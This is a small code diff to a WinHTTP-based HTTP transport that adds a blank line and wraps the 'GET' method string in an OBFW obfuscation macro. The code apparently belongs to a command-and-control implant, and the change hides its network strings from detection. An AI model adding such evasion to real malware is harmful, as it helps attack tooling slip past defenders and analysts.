@@ -129,6 +129,7 @@ namespace Http {
                 return_defer(ERROR_WINHTTP_INVALID_OPTION);
             }
         }
+
         if (Ctx->Transport.bProxy) {
             proxy->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
             proxy->proxy_info.lpszProxy     = Ctx->Transport.http->ProxyAddress;
@@ -215,7 +216,7 @@ namespace Http {
         uint32_t status     = 0;
         uint32_t n_status   = sizeof(uint32_t);
 
-        Ctx->Transport.http->Method = C_CAST(wchar_t*, L"GET");
+        Ctx->Transport.http->Method = C_CAST(wchar_t*, OBFW(L"GET"));
         if (
             !(request = CreateRequestContext()) ||
             !(proxy = CreateProxyContext(request)) ||
